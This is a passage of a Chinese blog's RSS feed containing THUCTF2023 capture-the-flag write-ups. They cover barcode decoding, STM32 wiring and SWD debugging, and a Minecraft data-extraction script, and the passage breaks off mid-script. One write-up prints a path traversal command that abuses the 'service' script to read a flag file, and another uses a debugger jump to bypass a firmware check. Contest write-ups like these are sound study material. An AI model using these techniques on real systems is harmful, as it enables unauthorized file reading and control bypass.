<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>ouuan's blog</title>
        <link>https://ouuan.moe</link>
        <description>ouuan 的博客。</description>
        <lastBuildDate>Sun, 03 Dec 2023 15:48:46 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>zh-CN</language>
        <copyright>Copyright © 2022 - 2023 ouuan
Licensed under CC BY-SA 4.0</copyright>
        <atom:link href="https://ouuan.moe/feed.xml" rel="self" type="application/rss+xml"/>
        <item>
            <title><![CDATA[THUCTF2023 IoT 赛道 WriteUp]]></title>
            <link>https://ouuan.moe/post/2023/12/thuctf2023-iot-writeup</link>
            <guid>https://ouuan.moe/post/2023/12/thuctf2023-iot-writeup</guid>
            <pubDate>Sun, 03 Dec 2023 15:48:46 GMT</pubDate>
            <description><![CDATA[






<p><s>IoT x 数字逻辑实验 √</s></p>
]]></description>
            <content:encoded><![CDATA[






<p><s>IoT x 数字逻辑实验 √</s></p>

<h2 id="barcode" class="heading"><a href="#barcode" class="heading-anchor" aria-label="章节： Barcode" tabindex="-1"></a><span>Barcode</span></h2>
<p><s>我不理解这道题为什么会突然出现在 IoT 赛道<span class="mojikumi-line-start">（</span></s></p>
<p>运行代码得到 flag <code>THUCTF<wbr>{<wbr>God_<wbr>say_<wbr>let_<wbr>s_<wbr>there_<wbr>be_<wbr>code_<wbr>1<wbr>}</code><span class="mojikumi-line-end">，</span><s>但是这个 <span class="mojikumi">“</span>let<span class="mojikumi-narrow-left">’</span>s there be<span class="mojikumi">”</span> 是什么鬼<span class="mojikumi-line-start">（</span></s></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h3 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h3><ile-root id="ile-1"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-1--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">PIL</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> Image</span></span>
<span></span>
<span><span style="color: #D6DEEB">im </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> Image.</span><span style="color: #B2CCD6">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">output.png</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">data </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> im.</span><span style="color: #B2CCD6">load</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #D6DEEB">b </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;&quot;</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">12</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> im.size</span><span style="color: #D6DEEB">[</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">24</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    b </span><span style="color: #C792EA">+=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> data[i, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">] </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> (</span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">, </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">0</span><span style="color: #D9F5DD">&quot;</span></span>
<span></span>
<span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&quot;&quot;</span><span style="color: #82AAFF">.</span><span style="color: #B2CCD6">join</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">[</span><span style="color: #C5E478">chr</span><span style="color: #D6DEEB">(</span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">[</span><span style="color: #82AAFF">i : i </span><span style="color: #C792EA">+</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">7</span><span style="color: #D6DEEB">]</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">))</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">for</span><span style="color: #82AAFF"> i </span><span style="color: #C792EA">in</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">0</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #C5E478">len</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">b</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">7</span><span style="color: #D6DEEB">)</span><span style="color: #D9F5DD">]</span><span style="color: #D6DEEB">))</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">from</span><span style="color: #403F53"> </span><span style="color: #4876D6">PIL</span><span style="color: #403F53"> </span><span style="color: #994CC3">import</span><span style="color: #403F53"> Image</span></span>
<span></span>
<span><span style="color: #403F53">im </span><span style="color: #994CC3">=</span><span style="color: #403F53"> Image.</span><span style="color: #0C969B">open</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;</span><span style="color: #C96765">output.png</span><span style="color: #111111">&quot;</span><span style="color: #403F53">)</span></span>
<span><span style="color: #403F53">data </span><span style="color: #994CC3">=</span><span style="color: #403F53"> im.</span><span style="color: #0C969B">load</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #403F53">b </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;&quot;</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">12</span><span style="color: #111111">,</span><span style="color: #4876D6"> im.size</span><span style="color: #403F53">[</span><span style="color: #AA0982">0</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">24</span><span style="color: #403F53">):</span></span>
<span><span style="color: #403F53">    b </span><span style="color: #994CC3">+=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">1</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #994CC3">if</span><span style="color: #403F53"> data[i, </span><span style="color: #AA0982">0</span><span style="color: #403F53">] </span><span style="color: #994CC3">==</span><span style="color: #403F53"> (</span><span style="color: #AA0982">0</span><span style="color: #403F53">, </span><span style="color: #AA0982">0</span><span style="color: #403F53">, </span><span style="color: #AA0982">0</span><span style="color: #403F53">) </span><span style="color: #994CC3">else</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">0</span><span style="color: #111111">&quot;</span></span>
<span></span>
<span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #111111">&quot;&quot;</span><span style="color: #4876D6">.</span><span style="color: #0C969B">join</span><span style="color: #403F53">(</span><span style="color: #111111">[</span><span style="color: #4876D6">chr</span><span style="color: #403F53">(</span><span style="color: #4876D6">int</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">[</span><span style="color: #4876D6">i : i </span><span style="color: #994CC3">+</span><span style="color: #4876D6"> </span><span style="color: #AA0982">7</span><span style="color: #403F53">]</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">2</span><span style="color: #403F53">))</span><span style="color: #4876D6"> </span><span style="color: #994CC3">for</span><span style="color: #4876D6"> i </span><span style="color: #994CC3">in</span><span style="color: #4876D6"> range</span><span style="color: #403F53">(</span><span style="color: #AA0982">0</span><span style="color: #111111">,</span><span style="color: #4876D6"> len</span><span style="color: #403F53">(</span><span style="color: #4876D6">b</span><span style="color: #403F53">)</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #AA0982">7</span><span style="color: #403F53">)</span><span style="color: #111111">]</span><span style="color: #403F53">))</span></span></code></pre></div></section>
<h2 id="stm32" class="heading"><a href="#stm32" class="heading-anchor" aria-label="章节： STM32" tabindex="-1"></a><span>STM32</span></h2>
<p>首先你要明白这题不需要你给 STM32 编程<span class="mojikumi-line-start">（</span><span class="mojikumi-line-end">，</span>虽然后来想起来感觉很蠢<span class="mojikumi-line-end">，</span>但我一上来先装了个 STM32 IDE<span class="mojikumi-line-end">，</span>装完感觉不对<span class="mojikumi-line-start">（</span></p>
<p>然后需要把线连对<span class="mojikumi-line-end">，</span>而把线连对最主要的是把 pin 看对<span class="mojikumi-line-end">，</span>芯片把圆圈放在左上角<span class="mojikumi-line-end">，</span>晶振多出来一个直角的那个角是一号脚<span class="mojikumi-line-end">，</span>编号是逆时针转圈依次编<span class="mojikumi-line-end">。</span></p>
<h3 id="uart" class="heading"><a href="#uart" class="heading-anchor" aria-label="章节： UART" tabindex="-1"></a><span>UART</span></h3>
<p>把 USB to TTL 输出的 3V3 和 GND 接到板子和晶振<span class="mojikumi-line-end">，</span>把晶振的输出接到 OSCIN<span class="mojikumi-line-end">，</span>把 UART TX (PA9) 接到 USB to TTL 的 RX<span class="mojikumi-line-end">，</span>然后就可以通过串口读到 flag<span class="mojikumi-line-end">。</span></p>
<h3 id="usb" class="heading"><a href="#usb" class="heading-anchor" aria-label="章节： USB" tabindex="-1"></a><span>USB</span></h3>
<p>按照电路图<span class="mojikumi-line-end">，</span>把 PA11 接到 USB 转 5pin 的 D-<span class="mojikumi-line-end">，</span>把 PA12 以及 5V 串上电阻接到 D+<span class="mojikumi-line-end">，</span>根据代码中的判断条件还需要把 PB6 和 PB7 接地<span class="mojikumi-line-end">。</span>然后插到电脑上<span class="mojikumi-line-end">，</span>会周期性把 flag1 <code>THUCTF<wbr>{<wbr>B4D_<wbr>USB_<wbr>H1D_<wbr>KEYB04RD_<wbr>!!}</code> 以键盘的方式输入到电脑上<span class="mojikumi-line-end">，</span>而设备的名称是 flag2<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/usb-2-flag.ceabf6f3.webp"><img srcset="/assets/usb-2-flag.f20d75aa.png" loading="lazy" src="/assets/usb-2-flag.f20d75aa.png" width="709" height="90" alt="usb-2 flag"></picture></p>
<h3 id="swd" class="heading"><a href="#swd" class="heading-anchor" aria-label="章节： SWD" tabindex="-1"></a><span>SWD</span></h3>
<p>把板子的 RST, SWCLK, SWDIO 连到 ST-LINK 上<span class="mojikumi-line-end">，</span>然后插到电脑上<span class="mojikumi-line-end">。</span></p>
<p>参考 <a href="https://github.com/stlink-org/stlink/blob/master/doc/tutorial.md">stlink/doc/tutorial.md</a><span class="mojikumi-line-end">，</span>通过 <code>st-util</code> 启动 GDB server<span class="mojikumi-line-end">，</span>然后启动 <code>arm<wbr>-<wbr>none<wbr>-<wbr>eabi<wbr>-<wbr>gdb</code><span class="mojikumi-line-end">，</span>输入 <code>layout asm</code> 和 <code>target<wbr> <wbr>extended<wbr>-<wbr>remote<wbr> :<wbr>4242</code><span class="mojikumi-line-end">，</span>设置断点 <code>b *0x800069c</code><span class="mojikumi-line-end">，</span>然后 <code>kill</code> 再 <code>run</code><span class="mojikumi-line-end">，</span>在断点观察到汇编如下<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/asm-branch.16e626d5.webp"><img srcset="/assets/asm-branch.bc54cc2e.png" loading="lazy" src="/assets/asm-branch.bc54cc2e.png" width="632" height="165" alt="asm branch"></picture></p>
<p>此时 <code>jump *0x800069e</code> 即可在串口接收到 flag1<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/uart-swd-1-flag.4e88140e.webp"><img srcset="/assets/uart-swd-1-flag.effb20d4.png" loading="lazy" src="/assets/uart-swd-1-flag.effb20d4.png" width="436" height="441" alt="uart swd-1 flag"></picture></p>
<p>查看 <code>sp</code> 的值<span class="mojikumi-line-end">，</span>然后打印栈上的字符串<span class="mojikumi-line-end">，</span>即可看到 flag2<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/swd-2-flag.5387efeb.webp"><img srcset="/assets/swd-2-flag.0fe62ba9.png" loading="lazy" src="/assets/swd-2-flag.0fe62ba9.png" width="886" height="102" alt="swd-2 flag"></picture></p>
<h2 id="这是你的电路板吗？这就不是！" class="heading"><a href="#这是你的电路板吗？这就不是！" class="heading-anchor" aria-label="章节： 这是你的电路板吗？这就不是！" tabindex="-1"></a><span>这是你的电路板吗？这就不是！</span></h2>
<p>使用搜索引擎找到 <a href="https://www.altium.com/viewer/">https<wbr>://<wbr>www<wbr>.<wbr>altium<wbr>.<wbr>com<wbr>/<wbr>viewer<wbr>/</a> <span class="mojikumi-line-end">，</span>用它打开附件中的 <code>Hi3861.zip</code><span class="mojikumi-line-end">，</span>可以看到 flag 的后半部分<span class="mojikumi-line-end">。</span>再在 layers 中设置只查看 top / bottom overlay 就可以看到整个 flag<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/pcb-top-overlay.5d44d53e.webp"><img srcset="/assets/pcb-top-overlay.56327237.png" loading="lazy" src="/assets/pcb-top-overlay.56327237.png" width="878" height="970" alt="top overlay"></picture></p>
<p><picture><source type="image/webp" srcset="/assets/pcb-bottom-overlay.e004283a.webp"><img srcset="/assets/pcb-bottom-overlay.0bf1921b.png" loading="lazy" src="/assets/pcb-bottom-overlay.0bf1921b.png" width="719" height="970" alt="bottom overlay"></picture></p>
<h2 id="harmony-turn-up-the-light" class="heading"><a href="#harmony-turn-up-the-light" class="heading-anchor" aria-label="章节： Harmony - Turn up the light!" tabindex="-1"></a><span>Harmony - Turn up the light!</span></h2>
<p>查看电路图得到答案是 GPIO02<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/led-gpio.a4b241e1.webp"><img srcset="/assets/led-gpio.337ab73f.png" loading="lazy" src="/assets/led-gpio.337ab73f.png" width="462" height="105" alt="led gpio"></picture></p>]]></content:encoded>
            <category domain="https://ouuan.moe/tag/writeup">writeup</category>
            <category domain="https://ouuan.moe/tag/ctf">ctf</category>
        </item>
        <item>
            <title><![CDATA[THUCTF2023 WriteUp]]></title>
            <link>https://ouuan.moe/post/2023/10/thuctf2023-writeup</link>
            <guid>https://ouuan.moe/post/2023/10/thuctf2023-writeup</guid>
            <pubDate>Sun, 22 Oct 2023 14:14:06 GMT</pubDate>
            <description><![CDATA[













































<blockquote>
<p>打 <a href="https://thuctf.redbud.info/games/6/">THUCTF</a> 打的</p>
</blockquote>
<p><s>什么比谁 ddl 爆得多挑战赛<span class="mojikumi-line-start">（</span></s></p>
]]></description>
            <content:encoded><![CDATA[













































<blockquote>
<p>打 <a href="https://thuctf.redbud.info/games/6/">THUCTF</a> 打的</p>
</blockquote>
<p><s>什么比谁 ddl 爆得多挑战赛<span class="mojikumi-line-start">（</span></s></p>

<h2 id="misc" class="heading"><a href="#misc" class="heading-anchor" aria-label="章节： Misc" tabindex="-1"></a><span>Misc</span></h2>
<h3 id="一道难题" class="heading"><a href="#一道难题" class="heading-anchor" aria-label="章节： 一道难题" tabindex="-1"></a><span>一道难题</span></h3>
<p>base64 decode <code class="break-all">aHR0cHM6Ly9kaXNjb3JkLmdnL1RZa1RNWkZnYiBvciBRUUdyb3VwOjUzNDg0MDcxOQ==</code> 得到 <code>https<wbr>://<wbr>discord<wbr>.<wbr>gg<wbr>/<wbr>TYkTMZFgb<wbr> <wbr>or<wbr> <wbr>QQGroup<wbr>:<wbr>534840719</code><span class="mojikumi-line-end">。</span></p>
<p>加入 Discord 得到 flag<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/checkin-flag.856c3959.webp"><img srcset="/assets/checkin-flag.71266403.png" loading="lazy" src="/assets/checkin-flag.71266403.png" width="517" height="97" alt="flag"></picture></p>
<h3 id="猫咪状态监视器" class="heading"><a href="#猫咪状态监视器" class="heading-anchor" aria-label="章节： 猫咪状态监视器" tabindex="-1"></a><span>猫咪状态监视器</span></h3>
<p><code>/<wbr>usr<wbr>/<wbr>sbin<wbr>/<wbr>service</code> 实际上是一个 shell 脚本<span class="mojikumi-line-end">，</span>执行 <code>/<wbr>etc<wbr>/<wbr>init<wbr>.<wbr>d</code> 里的服务<span class="mojikumi-line-end">，</span>但可以 path traversal<span class="mojikumi-line-end">，</span>使用 <code>service<wbr> ../../<wbr>bin<wbr>/<wbr>cat<wbr> /<wbr>flag<wbr>.<wbr>txt</code> 即可得到 flag<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/sc-flag.7341ce7c.webp"><img srcset="/assets/sc-flag.c75cc371.png" loading="lazy" src="/assets/sc-flag.c75cc371.png" width="467" height="185" alt="flag"></picture></p>
<h3 id="麦恩·库拉夫特" class="heading"><a href="#麦恩·库拉夫特" class="heading-anchor" aria-label="章节： 麦恩·库拉夫特" tabindex="-1"></a><span>麦恩·库拉夫特</span></h3>
<p>根据提示<span class="mojikumi-line-end">，</span>flag 附近会有钻石块<span class="mojikumi-line-end">。</span>使用 <a href="https://unmined.net/">uNmINeD</a> 可以直接搜索到钻石块的位置<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/mc-unmined.d3c9a56f.webp"><img srcset="/assets/mc-unmined.0d6904b3.png" loading="lazy" src="/assets/mc-unmined.0d6904b3.png" width="1826" height="915" alt="搜索钻石块位置"></picture></p>
<h4 id="level-1" class="heading"><a href="#level-1" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>tp 到钻石块位置即可看到<span class="mojikumi">：</span><wbr><span class="mojikumi-line-start">（</span>或者也可以进入旁观模式然后通过透视来找火把<span class="mojikumi-line-end">）</span></p>
<p><picture><source type="image/webp" srcset="/assets/mc-flag1.f89b4387.webp"><img srcset="/assets/mc-flag1.18a14156.png" loading="lazy" src="/assets/mc-flag1.18a14156.png" width="1920" height="1052" alt="flag1"></picture></p>
<h4 id="level-2" class="heading"><a href="#level-2" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>tp 到钻石块位置即可看到<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/mc-flag2.725b8913.webp"><img srcset="/assets/mc-flag2.3847ca53.png" loading="lazy" src="/assets/mc-flag2.3847ca53.png" width="1920" height="1052" alt="flag2"></picture></p>
<h4 id="level-3" class="heading"><a href="#level-3" class="heading-anchor" aria-label="章节： Level 3" tabindex="-1"></a><span>Level 3</span></h4>
<p>tp 到钻石块位置可以看到磁带机和显示屏<span class="mojikumi-line-end">。</span>显示屏的输入 / 磁带机的输出是每 4 bits 编码为红石信号的强度<span class="mojikumi-line-end">，</span>可以在下图所示位置读取到<span class="mojikumi-line-end">：</span></p>
<p><picture><source type="image/webp" srcset="/assets/mc-redstone.341e09c0.webp"><img srcset="/assets/mc-redstone.e5ca9298.png" loading="lazy" src="/assets/mc-redstone.e5ca9298.png" width="1920" height="1052" alt="读取红石信号强度"></picture></p>
<p>使用 <kbd>F3+I</kbd> 可以将当前指向方块的数据复制到剪贴板<span class="mojikumi-line-end">，</span>利用这个 feature 可以自动读取数据<span class="mojikumi">。</span><wbr><span class="mojikumi-line-start">（</span>感觉应该有更好的方法读取数据但我不会<span class="mojikumi-line-end">；</span>当然也可以直接根据磁带机的结构读存档就不用执行了<span class="mojikumi-line-end">，</span>但感觉分析磁带机结构也有点麻烦<span class="mojikumi-line-start">（</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Shell 代码块" data-v-ad49d235>Shell</h5><ile-root id="ile-2"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-2--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #637777">#!/bin/bash</span></span>
<span></span>
<span><span style="color: #82AAFF">sleep</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">5</span></span>
<span></span>
<span><span style="color: #C5E478">echo</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">flag3.log</span></span>
<span></span>
<span><span style="color: #C792EA">while</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">true</span><span style="color: #D6DEEB">; </span><span style="color: #C792EA">do</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #82AAFF">xdotool</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">key</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">F3+i</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">printf</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">%s %x\n</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">$(</span><span style="color: #82AAFF">date</span><span style="color: #ECC48D"> +%N)</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">$(</span><span style="color: #82AAFF">xsel</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">-b</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">-o</span><span style="color: #ECC48D"> </span><span style="color: #7FDBCA">|</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">sed</span><span style="color: #ECC48D"> </span><span style="color: #82AAFF">-E</span><span style="color: #ECC48D"> </span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">s/.*power=([0-9]+).*/\1/g</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">)</span><span style="color: #D9F5DD">&quot;</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">&gt;&gt;</span><span style="color: #D6DEEB"> </span><span style="color: #ECC48D">flag3.log</span></span>
<span><span style="color: #C792EA">done</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #989FB1">#!/bin/bash</span></span>
<span></span>
<span><span style="color: #4876D6">sleep</span><span style="color: #403F53"> </span><span style="color: #AA0982">5</span></span>
<span></span>
<span><span style="color: #4876D6">echo</span><span style="color: #403F53"> </span><span style="color: #0C969B">&gt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">flag3.log</span></span>
<span></span>
<span><span style="color: #994CC3">while</span><span style="color: #403F53"> </span><span style="color: #4876D6">true</span><span style="color: #403F53">; </span><span style="color: #994CC3">do</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">xdotool</span><span style="color: #403F53"> </span><span style="color: #4876D6">key</span><span style="color: #403F53"> </span><span style="color: #4876D6">F3+i</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">printf</span><span style="color: #403F53"> </span><span style="color: #111111">&#39;</span><span style="color: #C96765">%s %x\n</span><span style="color: #111111">&#39;</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #4876D6">$(date +%N)</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #4876D6">$(xsel -b -o </span><span style="color: #0C969B">|</span><span style="color: #4876D6"> sed -E </span><span style="color: #111111">&#39;</span><span style="color: #C96765">s/.*power=([0-9]+).*/\1/g</span><span style="color: #111111">&#39;</span><span style="color: #4876D6">)</span><span style="color: #111111">&quot;</span><span style="color: #403F53"> </span><span style="color: #0C969B">&gt;&gt;</span><span style="color: #403F53"> </span><span style="color: #4876D6">flag3.log</span></span>
<span><span style="color: #994CC3">done</span></span></code></pre></div></section>
<p>但是这样读取会有一定的误差<span class="mojikumi-line-end">，</span>通过记录时间戳并过采样可以一定程度上减小误差<span class="mojikumi-line-end">，</span>但光是这样难以消除到合理的水平<span class="mojikumi-line-end">。</span>可以在此基础上多采样几轮<span class="mojikumi-line-end">，</span>相当于进行更多次的过采样<span class="mojikumi-line-end">，</span>随后可以对每轮的结果取众数<span class="mojikumi-line-end">。</span>我最后是读了 12 轮<span class="mojikumi-line-end">，</span>大概 11 轮可以得到完全正确的文件<span class="mojikumi-line-end">，</span>稍少几轮可以得到破损但能够识别出 flag 的图片<span class="mojikumi-line-end">。</span></p>
<p>根据读取出的结果容易看出是一张 PNG<span class="mojikumi-line-end">，</span>所以可以根据其 signature 来判断开头结尾进行分割<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h5><ile-root id="ile-3"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-3--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> codecs</span></span>
<span><span style="color: #C792EA">from</span><span style="color: #D6DEEB"> rapidfuzz </span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> fuzz</span></span>
<span></span>
<span><span style="color: #D6DEEB">result </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">[]</span></span>
<span></span>
<span><span style="color: #C792EA">with</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">open</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">flag3.log</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB">) </span><span style="color: #C792EA">as</span><span style="color: #D6DEEB"> log:</span></span>
<span><span style="color: #D6DEEB">    lasttime </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span></span>
<span><span style="color: #D6DEEB">    last </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&#39;&#39;</span></span>
<span><span style="color: #D6DEEB">    total_delta </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> line </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> log:</span></span>
<span><span style="color: #D6DEEB">        time, x </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> line.</span><span style="color: #B2CCD6">split</span><span style="color: #D6DEEB">()</span></span>
<span><span style="color: #D6DEEB">        time </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">int</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">time</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">        delta </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #F78C6C">0</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> lasttime </span><span style="color: #C792EA">==</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">-</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">else</span><span style="color: #D6DEEB"> time </span><span style="color: #C792EA">-</span><span style="color: #D6DEEB"> lasttime</span></span>
